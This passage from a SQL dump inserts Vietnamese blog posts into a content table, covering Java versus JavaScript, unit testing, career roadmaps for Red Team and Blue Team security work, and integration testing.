tr&igrave;nh vi&ecirc;n c&oacute; thể t&igrave;m thấy lỗi một c&aacute;ch dễ d&agrave;ng</p>\r\n	</li>\r\n	<li>\r\n	<p>Lập tr&igrave;nh dựa tr&ecirc;n c&aacute;c lớp, d&ugrave;ng lớp l&agrave;m &ldquo;khu&ocirc;n&rdquo; để tạo n&ecirc;n đối tượng. Lớp kh&ocirc;ng phải l&agrave; đối tượng.</p>\r\n	</li>\r\n	<li>\r\n	<p>L&agrave; lựa chọn tối ưu v&agrave; hiệu quả nhất trong lập tr&igrave;nh Android</p>\r\n	</li>\r\n</ul>\r\n\r\n<p><strong>JAVASRIPT:</strong></p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>L&agrave; ng&ocirc;n ngữ kịch bản (scripted language). Code viết đến đ&acirc;u th&igrave; sẽ được dịch th&agrave;nh m&atilde; m&aacute;y đến đ&oacute; để m&aacute;y t&iacute;nh c&oacute; thể thực thi được.</p>\r\n	</li>\r\n	<li>\r\n	<p>Sử dụng h&igrave;nh thức x&aacute;c minh dữ liệu động. Đ&acirc;y l&agrave; một đặc trưng của ng&ocirc;n ngữ kịch bản. Dữ liệu được kiểm tra ngay trong qu&aacute; tr&igrave;nh chương tr&igrave;nh chạy.</p>\r\n	</li>\r\n	<li>\r\n	<p>Lập tr&igrave;nh dựa tr&ecirc;n nguy&ecirc;n mẫu, sử dụng nguy&ecirc;n mẫu để tạo, sao ch&eacute;p v&agrave; nh&acirc;n bản đối tượng. Bản th&acirc;n nguy&ecirc;n mẫu cũng l&agrave; đối tượng.</p>\r\n	</li>\r\n	<li>\r\n	<p>Chạy tr&ecirc;n tr&igrave;nh duyệt web, hiệu suất phụ thuộc v&agrave;o HTML v&agrave; CSS.</p>\r\n	</li>\r\n	<li>\r\n	<p>Được sử dụng để tạo c&aacute;c trang web động, c&oacute; thể tương t&aacute;c với người d&ugrave;ng n&ecirc;n l&agrave; lựa chọn tối ưu v&agrave; hiệu quả đối với lập tr&igrave;nh front-end.</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>-------------------------------------------------------------</p>\r\n\r\n<p><strong>3.</strong>&nbsp;<strong>N&Ecirc;N HỌC JAVA HAY JAVASCRIPT?</strong></p>\r\n\r\n<p>Mỗi ng&ocirc;n ngữ đều phục vụ những mục đ&iacute;ch sử dụng kh&aacute;c nhau v&agrave; được ứng dụng trong c&aacute;c trường hợp kh&aacute;c nhau. H&atilde;y chọn Java nếu cậu muốn viết một&nbsp;<strong>ứng dụng hoặc phần mềm c&oacute; li&ecirc;n quan đến lĩnh vực thương mại hoặc t&agrave;i ch&iacute;nh c&oacute; độ bảo mật cao tr&ecirc;n nền tảng di động, c&aacute;c ứng dụng hệ điều h&agrave;nh Android, ứng dụng nh&uacute;ng</strong>.</p>\r\n\r\n<p>C&ograve;n JavaScript sẽ ph&ugrave; hợp hơn cả khi cậu đang muốn<strong>&nbsp;l&agrave;m Front-end, tạo c&aacute;c trang web thương mại điện tử c&oacute; t&iacute;nh tương t&aacute;c v&agrave; t&ugrave;y chỉnh giao diện người d&ugrave;ng (UI)</strong>.</p>\r\n\r\n<p>---------------------------------------------------</p>\r\n\r\n<p>Do c&oacute; sự tương đồng về t&ecirc;n gọi n&ecirc;n rất nhiều người đ&atilde; cho rằng Java v&agrave; JavaScript l&agrave; t&ecirc;n gọi chung của một loại ng&ocirc;n ngữ lập tr&igrave;nh. Tr&ecirc;n thực tế, giữa 2 ng&ocirc;n ngữ n&agrave;y tồn tại rất nhiều điểm kh&aacute;c biệt r&otilde; rệt m&agrave; chỉ khi ứng dụng v&agrave;o thực tế mới c&oacute; thể nhận biết r&otilde; được. Việc x&aacute;c định&nbsp;<strong>Java v&agrave; JavaScript kh&aacute;c nhau thế n&agrave;o</strong>&nbsp;sẽ gi&uacute;p cậu tr&aacute;nh những sự cố do nhầm lẫn v&agrave; thực hiện c&ocirc;ng việc hiệu quả hơn.</p>', 'photo/img-4.jpg', 'admin', 0, '2024-06-29 06:25:21'),
(94, 'Unit test – cấp độ kiểm thử dành cho developer', 'dev ơi mình đi đâu thế?', '<p><strong>Unit test l&agrave; g&igrave;? Ai sẽ thực hiện kiểm thử ở cấp độ n&agrave;y?</strong></p>\r\n\r\n<p>Unit l&agrave; một phần code nhỏ nhất c&oacute; thể kiểm tra được như l&agrave; thủ tục (Procedure), lớp (Class), h&agrave;m(Function) hoặc c&aacute;c phương thức (Method).</p>\r\n\r\n<p>Unit testing l&agrave; một loại kiểm thử phần mềm. Trong đ&oacute;, c&aacute;c đơn vị (unit) hoặc th&agrave;nh phần ri&ecirc;ng lẻ của phần mềm được kiểm thử. Mục đ&iacute;ch của việc n&agrave;y l&agrave; x&aacute;c minh t&iacute;nh ch&iacute;nh x&aacute;c của mỗi đơn vị code.</p>\r\n\r\n<p>Unit test l&agrave; loại kiểm thử nhưng tực tế người thực hiện n&oacute; lại kh&ocirc;ng phải l&agrave; tester m&agrave; ch&iacute;nh l&agrave; developer - người ph&aacute;t triển đoạn code. Unit test thường sử dụng kỹ thuật kiểm thử hộp trắng (WhiteBox test) v&agrave; l&agrave; bước kiểm thử đầu ti&ecirc;n trong qu&aacute; tr&igrave;nh kiểm thử dự &aacute;n.</p>\r\n\r\n<p><strong>Lợi &iacute;ch m&agrave; unit test mang lại</strong></p>\r\n\r\n<p>Ch&uacute;ng ta đều biết rằng, nếu ph&aacute;t hiện v&agrave; sửa lỗi c&agrave;ng sớm th&igrave; c&agrave;ng tiết kiệm thời gian, c&ocirc;ng sức v&agrave; cả tiền bạc. V&agrave; unit test l&agrave; cấp độ kiểm thử đầu ti&ecirc;n, sớm nhất trong qu&aacute; tr&igrave;nh ph&aacute;t triển, vậy n&ecirc;n ch&uacute;ng ta kh&ocirc;ng n&ecirc;n cố gắng tiết kiệm thời gian bằng c&aacute;ch thực hiện unit test ở mức tối thiểu hoặc bỏ qua n&oacute;.</p>\r\n\r\n<p>Đ&acirc;y l&agrave; một trong những l&yacute; do m&agrave; ch&uacute;ng ta n&ecirc;n thực hiện kiểm thử đơn vị:</p>\r\n\r\n<p>- Unit tests gi&uacute;p sớm fix bugs trong v&ograve;ng đời ph&aacute;t triển (development cycle) v&agrave; tiết kiệm chi ph&iacute;.</p>\r\n\r\n<p>- Tạo ra m&ocirc;i trường l&yacute; tưởng để tiến h&agrave;nh kiểm tra bất kỳ đoạn code n&agrave;o, c&oacute; thể thăm d&ograve; v&agrave; ph&aacute;t hiện lỗi sai một c&aacute;ch ch&iacute;nh x&aacute;c. Duy tr&igrave; sự ổn định của to&agrave;n bộ PM, tiết kiệm thời gian.</p>\r\n\r\n<p>- Ph&aacute;t hiện khi c&aacute;c thuật to&aacute;n thực thi kh&ocirc;ng hiệu quả, thủ tục chạy vượt qu&aacute; giới hạn thời gian.</p>\r\n\r\n<p>- Ph&aacute;t hiện lỗi về thiết kế, xử l&yacute; hệ thống, m&ocirc; h&igrave;nh thiết kế.</p>\r\n\r\n<p>- Ph&aacute;t hiện lỗi c&oacute; thể xảy ra trong những t&igrave;nh huống rất hẹp.</p>\r\n\r\n<p>- Tạo ra h&agrave;ng r&agrave;o chắn an to&agrave;n cho khối m&atilde;: Bất kỳ sự thay đổi n&agrave;o cũng c&oacute; khả năng t&aacute;c động đến h&agrave;ng n&agrave;o chắn n&agrave;y v&agrave; th&ocirc;ng b&aacute;o cả những nguy hiểm tiềm t&agrave;ng..</p>\r\n\r\n<p><strong>C&aacute;ch thực hiện Unit testing</strong></p>\r\n\r\n<p>Để thực hiện unit test, dev c&oacute; thể thực hiện kiểm tra thủ c&ocirc;ng hoặc kiểm thử tự động. Dev thường sẽ viết một đoạn code để kiểm tra function. Hoặc c&oacute; thể sử dụng Framework UnitTest để ph&aacute;t triển test cases tự động.</p>\r\n\r\n<p><em>C&aacute;c bước thực hiện Unit test:</em></p>\r\n\r\n<p>1. Lập kế hoạch:</p>\r\n\r\n<p>X&aacute;c định mục ti&ecirc;u: X&aacute;c định r&otilde; r&agrave;ng mục ti&ecirc;u của việc Unit Test, v&iacute; dụ như kiểm tra chức năng, hiệu suất, bảo mật, v.v.</p>\r\n\r\n<p>Chọn framework: Lựa chọn framework Unit Test ph&ugrave; hợp với ng&ocirc;n ngữ lập tr&igrave;nh v&agrave; nhu cầu của bạn. Một số framework phổ biến bao gồm JUnit (Java), NUnit (.NET), Jest (JavaScript), v.v.</p>\r\n\r\n<p>Lựa chọn đối tượng test: X&aacute;c định c&aacute;c đơn vị cần test, v&iacute; dụ như class, function, module, v.v.</p>\r\n\r\n<p>2. Viết test case:</p>\r\n\r\n<p>Viết test case cho từng đơn vị test đ&atilde; lựa chọn. Test case cần bao gồm:</p>\r\n\r\n<p><em>T&ecirc;n test case</em>: M&ocirc; tả ngắn gọn mục đ&iacute;ch của test case.</p>\r\n\r\n<p><em>Dữ liệu đầu v&agrave;o:</em>&nbsp;Dữ liệu cần thiết để thực hiện test case.</p>\r\n\r\n<p><em>Kết quả mong đợi</em>: Kết quả dự kiến sau khi thực hiện test case.</p>\r\n\r\n<p>Ch&uacute;ng ta cũng n&ecirc;n sử dụng kỹ thuật test ph&ugrave; hợp, v&iacute; dụ như:</p>\r\n\r\n<p><em>Statement Coverage (độ phủ c&acirc;u lệnh).</em></p>\r\n\r\n<p><em>Decision Coverage (độ phủ quyết định).</em></p>\r\n\r\n<p><em>Branch Coverage (độ phủ nh&aacute;nh).</em></p>\r\n\r\n<p><em>Condition Coverage (độ phủ điều kiện).</em></p>\r\n\r\n<p>3. Chạy test:</p>\r\n\r\n<p>Chạy test case bằng framework đ&atilde; chọn v&agrave; ph&acirc;n t&iacute;ch kết quả test:</p>\r\n\r\n<p>- Test th&agrave;nh c&ocirc;ng: X&aacute;c nhận chức năng hoạt động ch&iacute;nh x&aacute;c.</p>\r\n\r\n<p>- Test thất bại: X&aacute;c định nguy&ecirc;n nh&acirc;n lỗi v&agrave; sửa lỗi.</p>\r\n\r\n<p>4. Lặp lại:</p>\r\n\r\n<p>Lặp lại c&aacute;c bước tr&ecirc;n cho đến khi tất cả c&aacute;c chức năng được test đầy đủ.</p>\r\n\r\n<p>Cập nhật test case khi c&oacute; thay đổi trong code.</p>\r\n\r\n<p><strong>Một số c&ocirc;ng cụ hỗ trợ</strong></p>\r\n\r\n<p><strong>Junit</strong>: Junit l&agrave; c&ocirc;ng cụ miễn ph&iacute; được sử dụng cho ng&ocirc;n ngữ lập tr&igrave;nh Java. N&oacute; cung cấp assertions để x&aacute;c định phương ph&aacute;p kiểm tra.</p>\r\n\r\n<p><strong>NUnit</strong>: NUnit l&agrave; framework unit-testing được sử dụng rộng r&atilde;i cho C# v&agrave; .NET. N&oacute; c&oacute; hỗ trợ c&aacute;c b&agrave;i kiểm tra data-driven c&oacute; thể chạy song song.</p>\r\n\r\n<p><strong>JMockit</strong>: JMockit l&agrave; c&ocirc;ng cụ Unit testing m&atilde; nguồn mở. N&oacute; l&agrave; c&ocirc;ng cụ code coverage với c&aacute;c số liệu đường (line) v&agrave; đường dẫn (path). C&ocirc;ng cụ n&agrave;y cung cấp Line coverage, Path Coverage, v&agrave; Data Coverage.</p>\r\n\r\n<p><strong>EMMA</strong>: EMMA l&agrave; một toolkit m&atilde; nguồn mở để ph&acirc;n t&iacute;ch v&agrave; b&aacute;o c&aacute;o code được viết bằng ng&ocirc;n ngữ Java. Emma hỗ trợ c&aacute;c loại coverage như method, line, basic block.</p>\r\n\r\n<p><strong>PHPUnit</strong>: PHPUnit l&agrave; c&ocirc;ng cụ unit testing d&agrave;nh cho lập tr&igrave;nh vi&ecirc;n PHP.</p>\r\n\r\n<p>T&oacute;m lại đ&acirc;y l&agrave; một bước kiểm thử quan trọng gi&uacute;p đảm bảo chất lượng phần mềm chũng như tiết kiệm chi ph&iacute; dự &aacute;n, cũng gi&uacute;p giải ph&oacute;ng tester khỏi những con bug o&aacute;i oăm trong qu&aacute; tr&igrave;nh kiểm thử.</p>', 'photo/mainImg.png', 'admin', 0, '2024-06-29 06:25:21'),
(95, 'Red Team - Cách trở thành một h&#39;acker chính đạo', 'dev ơi mình đi đâu thế?', '<p>Cậu biết kh&ocirc;ng, &quot;Red Team&quot; l&agrave; một thuật ngữ chuy&ecirc;n ng&agrave;nh trong lĩnh vực an ninh mạng, đề cập đến một nh&oacute;m c&aacute;c chuy&ecirc;n gia bảo mật thực hiện c&aacute;c cuộc tấn c&ocirc;ng m&ocirc; phỏng nhằm đ&aacute;nh gi&aacute; v&agrave; n&acirc;ng cao độ an to&agrave;n của hệ thống.</p>\r\n\r\n<blockquote>&quot;Red Teamers&quot; hoạt động tương tự như c&aacute;c hac&#39;ker &quot;thật&quot;, nhưng họ l&agrave; &quot;hac&#39;ker mũ trắng&quot;, tấn c&ocirc;ng điểm yếu trong hệ thống sau khi nhận được sự cho ph&eacute;p, v&agrave; với mục đ&iacute;ch cải thiện.</blockquote>\r\n\r\n<p>Để trở th&agrave;nh một th&agrave;nh vi&ecirc;n của Red Team, cậu cần phải trải qua một h&agrave;nh tr&igrave;nh d&agrave;i v&agrave; nhiều th&aacute;ch thức. Đ&acirc;y l&agrave; roadmap dự kiến cho h&agrave;nh tr&igrave;nh n&agrave;y:</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p><strong>Hiểu biết cơ bản về IT:</strong>&nbsp;Muốn l&agrave;m chuy&ecirc;n gia an ninh mạng th&igrave; chẳng thể n&agrave;o lướt qua bước cơ bản n&agrave;y được. Học về mạng m&aacute;y t&iacute;nh, hệ điều h&agrave;nh (Windows/ Linux/ MacOS), lập tr&igrave;nh (Python, Bash, PowerShell l&agrave; những lựa chọn th&ocirc;ng dụng) sẽ l&agrave; m&oacute;c x&iacute;ch đầu ti&ecirc;n cho h&agrave;nh tr&igrave;nh của cậu.</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Củng cố kiến thức an ninh mạng:</strong>&nbsp;Học về c&aacute;c kh&aacute;i niệm an ninh mạng, c&aacute;c loại tấn c&ocirc;ng v&agrave; c&aacute;ch ph&ograve;ng thủ. Một số chứng chỉ như CompTIA Security+ v&agrave; Cisco&#39;s CCNA sẽ l&agrave; điểm khởi đầu tốt.</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>X&acirc;y dựng kỹ năng H&#39;ack &Eacute;t-b&iacute;t:</strong></p>\r\n	</li>\r\n</ul>\r\n\r\n<blockquote><strong>Học về Ethical Hac&#39;king:</strong>&nbsp;Đăng k&yacute; c&aacute;c kh&oacute;a học, c&oacute; thể qua EC-Council để lấy chứng chỉ CEH (Certified Ethical Hac&#39;ker) hoặc qua Offensive Security để lấy chứng chỉ OSCP (Offensive Security Certified Professional).</blockquote>\r\n\r\n<blockquote><strong>Thực h&agrave;nh tr&ecirc;n m&ocirc;i trường ảo:</strong>&nbsp;Sử dụng c&aacute;c lab như H&#39;ack The Box hoặc OverTheWire để luyện tập kỹ năng tấn c&ocirc;ng m&ocirc; phỏng.</blockquote>\r\n\r\n<ul>\r\n	<li>\r\n	<p><strong>Chuy&ecirc;n m&ocirc;n h&oacute;a:</strong></p>\r\n	</li>\r\n</ul>\r\n\r\n<blockquote><strong>Học s&acirc;u về Penetration Testing:</strong>&nbsp;Đ&acirc;y l&agrave; kỹ năng cốt l&otilde;i của Red Team, cần phải thấu hiểu v&agrave; thực h&agrave;nh nhiều về việc t&igrave;m lỗ hổng.</blockquote>\r\n\r\n<blockquote><strong>Đi s&acirc;u v&agrave;o ph&acirc;n t&iacute;ch m&atilde; độc v&agrave; Reverse Engineering:</strong>&nbsp;Hiểu c&aacute;ch m&agrave; m&atilde; độc hoạt động v&agrave; c&aacute;ch đảo ngược quy tr&igrave;nh để nhận diện h&agrave;nh vi độc hại.</blockquote>\r\n\r\n<ul>\r\n	<li>\r\n	<p><strong>Ph&aacute;t triển kỹ năng mềm:</strong></p>\r\n	</li>\r\n</ul>\r\n\r\n<blockquote><strong>Kỹ nghệ x&atilde; hội (Social Engineering):</strong>&nbsp;Rất nhiều cuộc tấn c&ocirc;ng th&agrave;nh c&ocirc;ng bắt nguồn từ việc lợi dụng yếu tố con người.</blockquote>\r\n\r\n<blockquote><strong>B&aacute;o c&aacute;o v&agrave; truyền đạt:</strong>&nbsp;Biết c&aacute;ch tr&igrave;nh b&agrave;y th&ocirc;ng tin phức tạp một c&aacute;ch dễ hiểu l&agrave; cực kỳ quan trọng.</blockquote>\r\n\r\n<ul>\r\n	<li>\r\n	<p><strong>Thực chiến:</strong></p>\r\n	</li>\r\n</ul>\r\n\r\n<blockquote><strong>M&ocirc; phỏng t&igrave;nh huống thực tế:</strong>&nbsp;Tham gia v&agrave;o cuộc thi Capture The Flag (CTF), thực h&agrave;nh Red Team tr&ecirc;n c&aacute;c m&ocirc; h&igrave;nh c&ocirc;ng ty thật sự.</blockquote>\r\n\r\n<blockquote><strong>Thực tập hoặc c&ocirc;ng việc thực tế:</strong>&nbsp;Cố gắng t&igrave;m kiếm cơ hội để &aacute;p dụng kiến thức v&agrave;o thực tế.</blockquote>\r\n\r\n<p><strong>NGUỒN HỌC TẬP ĐỀ XUẤT CHO CẬU:</strong></p>\r\n\r\n<ol>\r\n	<li>\r\n	<p><strong>Kho&aacute; học online:</strong>&nbsp;Platforms như Udemy, Coursera, Cybrary, v&agrave; SecurtyTube c&oacute; nhiều kh&oacute;a học về an ninh mạng từ cơ bản đến chuy&ecirc;n s&acirc;u. Đặc biệt l&agrave; tryhac&#39;kme&nbsp;<img alt=\":v\" src=\"https://static.xx.fbcdn.net/images/emoji.php/v9/e31/1/16/PACMAN.png\" style=\"height:16px; width:16px\" /></p>\r\n	</li>\r\n	<li>\r\n	<p><strong>S&aacute;ch v&agrave; t&agrave;i liệu:</strong>&nbsp;&quot;The H&#39;acker Playbook&quot; series v&agrave; &quot;Red Team Field Manual&quot; l&agrave; những cuốn s&aacute;ch kinh điển kh&ocirc;ng n&ecirc;n bỏ qua.</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Cộng đồng v&agrave; sự kiện:</strong>&nbsp;Tham gia c&aacute;c hội nghị an ninh mạng như Def Con, Black Hat để giao lưu, học hỏi. V&agrave; đừng qu&ecirc;n ch&uacute;ng m&igrave;nh c&ograve;n c&oacute; h&agrave;nh tinh Cyber Mely nữa cậu nh&eacute;!</p>\r\n	</li>\r\n</ol>\r\n\r\n<p>T&oacute;m lại, con đường trở th&agrave;nh Red Team kh&ocirc;ng hề đơn giản nhưng lại cực kỳ hấp dẫn v&agrave; đầy th&aacute;ch thức. Ch&igrave;a kh&oacute;a ch&iacute;nh l&agrave; thực h&agrave;nh kh&ocirc;ng ngừng, học hỏi li&ecirc;n tục, v&agrave; kh&ocirc;ng ngại đối mặt với những kh&oacute; khăn. Hi vọng những chia sẻ tr&ecirc;n sẽ c&oacute; &iacute;ch với cậu.</p>', 'photo/Favicon.png', 'admin', 0, '2024-06-29 06:25:21'),
(96, 'Blue Team - Học gì để trở thành đối trọng của H*acker', 'dev ơi mình đi đâu thế?', '<p>&quot;Blue Team&quot; l&agrave; đội qu&acirc;n &quot;ph&ograve;ng thủ&quot; trong lĩnh vực an ninh mạng. Kh&aacute;c với Red Team chuy&ecirc;n tấn c&ocirc;ng, Blue Team ch&uacute; trọng v&agrave;o việc bảo vệ, ph&aacute;t hiện v&agrave; phản ứng lại với c&aacute;c mối đe dọa. C&ocirc;ng việc bao gồm ph&acirc;n t&iacute;ch hệ thống, mạng, điều chỉnh cấu h&igrave;nh bảo mật, v&agrave; thiết lập c&aacute;c ch&iacute;nh s&aacute;ch để ngăn chặn c&aacute;c cuộc tấn c&ocirc;ng.</p>\r\n\r\n<p>ROADMAP ĐỂ TRỞ TH&Agrave;NH BLUE TEAM:</p>\r\n\r\n<p><strong>1. Nắm vững kiến thức cơ bản:</strong></p>\r\n\r\n<ul>\r\n	<li>\r\n	<p><strong>C&aacute;c kh&aacute;i niệm an ninh mạng cơ bản:</strong>&nbsp;Đi s&acirc;u v&agrave;o c&aacute;c nguy&ecirc;n tắc v&agrave; kh&aacute;i niệm cốt l&otilde;i về an ninh mạng.</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Hệ thống v&agrave; Mạng m&aacute;y t&iacute;nh:</strong>&nbsp;Hiểu r&otilde; về c&aacute;ch thức hoạt động của hệ thống m&aacute;y t&iacute;nh v&agrave; mạng m&aacute;y t&iacute;nh.</p>\r\n	</li>\r\n	<li>\r\n	<p>-&nbsp;<strong>Lập tr&igrave;nh v&agrave; Scripting:</strong>&nbsp;C&oacute; kỹ năng lập tr&igrave;nh cơ bản sẽ gi&uacute;p cậu tự động h&oacute;a v&agrave; xử l&yacute; nhanh ch&oacute;ng c&aacute;c nhiệm vụ.</p>\r\n	</li>\r\n</ul>\r\n\r\n<p><strong>2. Học về kiến thức bảo mật:</strong></p>\r\n\r\n<ul>\r\n	<li>\r\n	<p><strong>Chứng Chỉ</strong>: Lấy c&aacute;c chứng chỉ như CompTIA Security+, CISSP (Certified Information Systems Security Professional), gia nhập ISACA hoặc thu được chứng chỉ CISM (Certified Information Security Manager).</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>White hat h*acking:</strong>&nbsp;Nắm bắt c&aacute;ch thức tấn c&ocirc;ng từ Red Team để c&oacute; thể ph&ograve;ng thủ tốt hơn.</p>\r\n	</li>\r\n</ul>\r\n\r\n<p><strong>3. M&ocirc; phỏng v&agrave; Xử l&yacute; sự cố:</strong></p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>X&acirc;y dựng v&agrave; M&ocirc; phỏng mạng: Học c&aacute;ch thiết lập v&agrave; bảo vệ c&aacute;c m&ocirc;i trường mạng giả lập.</p>\r\n	</li>\r\n	<li>\r\n	<p>Incident Response: Ph&aacute;t triển kỹ năng phản ứng sự cố v&agrave; điều tra sự cố an ninh mạng.</p>\r\n	</li>\r\n</ul>\r\n\r\n<p><strong>4. Chuy&ecirc;n s&acirc;u về bảo mật:</strong></p>\r\n\r\n<ul>\r\n	<li>\r\n	<p><strong>Security Information and Event Management (SIEM):</strong>&nbsp;Nắm vững c&aacute;ch sử dụng v&agrave; cấu h&igrave;nh c&aacute;c c&ocirc;ng cụ SIEM.</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Threat Hunting:</strong>&nbsp;Ph&aacute;t triển kỹ năng proactively t&igrave;m kiếm c&aacute;c mối đe dọa tiềm ẩn trong mạng.</p>\r\n	</li>\r\n</ul>\r\n\r\n<p><strong>5. Tinh thần Teamwork v&agrave; b&aacute;o c&aacute;o:</strong></p>\r\n\r\n<ul>\r\n	<li>\r\n	<p><strong>Teamwork:</strong>&nbsp;Ph&aacute;t triển kỹ năng l&agrave;m việc nh&oacute;m v&agrave; phối hợp với Red Team để thực hiện c&aacute;c b&agrave;i kiểm tra m&ocirc; phỏng.</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Kỹ năng B&aacute;o c&aacute;o:</strong>&nbsp;C&oacute; khả năng t&oacute;m lược v&agrave; tr&igrave;nh b&agrave;y th&ocirc;ng tin một c&aacute;ch r&otilde; r&agrave;ng, s&uacute;c t&iacute;ch.</p>\r\n	</li>\r\n</ul>\r\n\r\n<p><strong>6. Thực Chiến:</strong></p>\r\n\r\n<ul>\r\n	<li>\r\n	<p><strong>Tham gia CTFs:</strong>&nbsp;Học hỏi từ c&aacute;c kịch bản thực tế th&ocirc;ng qua việc giải quyết c&aacute;c challenges trong c&aacute;c cuộc thi Capture The Flag.</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Kinh nghiệm thực tế:</strong>&nbsp;T&igrave;m kiếm cơ hội thực tập hoặc l&agrave;m việc tại c&aacute;c vị tr&iacute; li&ecirc;n quan đến an ninh mạng.</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>NGUỒN HỌC ĐỀ XUẤT CHO CẬU:</p>\r\n\r\n<ol>\r\n	<li>\r\n	<p><strong>Kho&aacute; học trực tuyến:</strong>&nbsp;SANS Institute, Cybrary v&agrave; Infosec Institute đều cung cấp c&aacute;c kh&oacute;a học chất lượng cao về c&aacute;c chủ đề từ cơ bản đến chuy&ecirc;n s&acirc;u.</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Hội thảo v&agrave; Workshops:</strong>&nbsp;Tham dự c&aacute;c sự kiện như Blue Team Village tại DEF CON để học hỏi từ c&aacute;c chuy&ecirc;n gia h&agrave;ng đầu.</p>\r\n	</li>\r\n	<li>\r\n	<p><strong>S&aacute;ch chuy&ecirc;n ng&agrave;nh:</strong>&nbsp;C&oacute; rất nhiều s&aacute;ch bảo mật chất lượng cao như &ldquo;Blue Team Handbook: Incident Response Edition&rdquo; v&agrave; &ldquo;The Practice of Network Security Monitoring&rdquo;.</p>\r\n	</li>\r\n</ol>\r\n\r\n<p>Hướng dẫn n&agrave;y c&oacute; lẽ đ&atilde; đủ để cậu tạo n&ecirc;n một h&agrave;nh tr&igrave;nh th&uacute; vị v&agrave; gi&uacute;p cậu t&igrave;m thấy hứng th&uacute; trong việc bảo vệ thế giới mạng khỏi những kẻ xấu. Như một &quot;bức tường lửa sống&quot; của đời thực, Blue Team cần phải rất ki&ecirc;n nhẫn, cẩn trọng v&agrave; lu&ocirc;n sẵn s&agrave;ng đối ph&oacute; với những t&igrave;nh huống kh&ocirc;ng ngờ nhất. Ch&uacute;c cậu th&agrave;nh c&ocirc;ng tr&ecirc;n h&agrave;nh tr&igrave;nh trở th&agrave;nh một Blue Team!</p>', 'photo/cpu_gpu.jpg', 'admin', 0, '2024-06-29 06:25:21');
INSERT INTO `contentmembers` (`id`, `title`, `url`, `content`, `image`, `author`, `view_count`, `reg_date`) VALUES
(97, 'Kiểm thử tích hợp - Integration testing', 'dev ơi mình đi đâu thế?', '<p>Kiểm thử t&iacute;ch hợp (Integration Testing) tập trung v&agrave;o kiểm tra giao tiếp dữ liệu giữa c&aacute;c m&ocirc;-đun. Do đ&oacute;, n&oacute; cũng được gọi l&agrave; &ldquo;I&amp;T&rdquo; (T&iacute;ch hợp v&agrave; Kiểm tra), &ldquo;Kiểm tra chuỗi&rsquo; v&agrave; đ&ocirc;i khi l&agrave; &ldquo;Kiểm tra luồng&rdquo;.</p>\r\n\r\n<p><strong>Integration test</strong></p>\r\n\r\n<p>Một dự &aacute;n phần mềm điển h&igrave;nh bao gồm nhiều modules phần mềm, được ph&aacute;t triển bởi c&aacute;c lập tr&igrave;nh vi&ecirc;n kh&aacute;c nhau. Kiểm thử t&iacute;ch hợp l&agrave; một loại kiểm thử trong đ&oacute; c&aacute;c modules của phần mềm được t&iacute;ch hợp logic v&agrave; được kiểm thử theo nh&oacute;m. Mục đ&iacute;ch của cấp độ kiểm tra n&agrave;y l&agrave; để lộ ra c&aacute;c khiếm khuyết (lỗi) trong tương t&aacute;c giữa c&aacute;c modules phần mềm khi ch&uacute;ng được t&iacute;ch hợp với nhau.</p>\r\n\r\n<p>V&iacute; dụ c&ocirc;ng ty bạn nhận được y&ecirc;u cầu ph&aacute;t triển trang web mua sắm trực tuyến. Sau khi thu thập y&ecirc;u cầu, ph&acirc;n t&iacute;ch v&agrave; thiết kế ho&agrave;n tất, một nh&agrave; ph&aacute;t triển đ&atilde; được chỉ định để ph&aacute;t triển từng module b&ecirc;n dưới.</p>\r\n\r\n<p>&middot; Đăng k&yacute; v&agrave; x&aacute;c thực người d&ugrave;ng / Đăng nhập</p>\r\n\r\n<p>&middot; Danh mục sản phẩm</p>\r\n\r\n<p>&middot; Giỏ h&agrave;ng</p>\r\n\r\n<p>&middot; Thanh to&aacute;n</p>\r\n\r\n<p>&middot; T&iacute;ch hợp cổng thanh to&aacute;n</p>\r\n\r\n<p>&middot; Theo d&otilde;i vận chuyển v&agrave; g&oacute;i h&agrave;ng</p>\r\n\r\n<p>Sau khi c&aacute;c dev ph&aacute;t triển v&agrave; thực hiện unit test th&igrave; họ tiến h&agrave;nh kết hợp c&aacute;c modules lại với nhau, l&uacute;c n&agrave;y ch&uacute;ng ta cần thực hiện kiểm thử để x&aacute;c nhận rằng tất cả c&aacute;c m&ocirc;-đun c&oacute; thể hoạt động c&ugrave;ng nhau. Khi triển khai tất cả m&atilde; của họ trong một m&aacute;y chung, họ thấy rằng ứng dụng kh&ocirc;ng hoạt động như mong đợi v&igrave; c&aacute;c modules ri&ecirc;ng lẻ kh&ocirc;ng hoạt động tốt với nhau. C&oacute; một số lỗi như - sau khi đăng nhập, giỏ h&agrave;ng của người d&ugrave;ng kh&ocirc;ng hiển thị c&aacute;c mục họ đ&atilde; th&ecirc;m trước đ&oacute;, số tiền h&oacute;a đơn kh&ocirc;ng bao gồm chi ph&iacute; vận chuyển, v.v.</p>\r\n\r\n<p>Như vậy, kiểm thử t&iacute;ch hợp gi&uacute;p ch&uacute;ng ta x&aacute;c định, khắc phục c&aacute;c sự cố v&agrave; đảm bảo rằng to&agrave;n bộ ứng dụng hoạt động như mong đợi.</p>\r\n\r\n<p><strong>Phương ph&aacute;p tiếp cận Integration test</strong></p>\r\n\r\n<p><em>1. Phương ph&aacute;p Big Bang</em>:</p>\r\n\r\n<p><strong>M&ocirc; tả:</strong>&nbsp;Trong phương ph&aacute;p Big Bang, tất cả c&aacute;c modules phần mềm được t&iacute;ch hợp c&ugrave;ng một l&uacute;c v&agrave; sau đ&oacute; được kiểm thử như một hệ thống ho&agrave;n chỉnh.</p>\r\n\r\n<p><strong>Ưu điểm</strong>:</p>\r\n\r\n<p>Đơn giản v&agrave; dễ thực hiện.</p>\r\n\r\n<p>C&oacute; thể ph&aacute;t hiện c&aacute;c lỗi hệ thống phức tạp.</p>\r\n\r\n<p><strong>Nhược điểm:</strong></p>\r\n\r\n<p>Kh&oacute; khăn trong việc x&aacute;c định nguồn gốc của lỗi.</p>\r\n\r\n<p>C&oacute; thể 